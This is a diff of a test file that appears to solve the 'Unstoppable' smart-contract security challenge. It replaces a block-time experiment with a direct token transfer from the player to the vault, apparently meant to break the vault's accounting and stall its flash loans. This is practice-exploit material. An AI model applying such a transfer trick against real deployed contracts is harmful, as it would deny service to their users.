@@ -52,10 +52,9 @@ describe("[Challenge] Unstoppable", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
-    const newTime = 2n ** 64n - 1n;
-    await helpers.time.increaseTo(newTime);
-    const blockTimestamp = await helpers.time.latest();
-    console.log(blockTimestamp);
+    await token
+      .connect(player)
+      .transfer(vault.address, ethers.utils.parseEther("1"));
   });
 
   after(async function () {
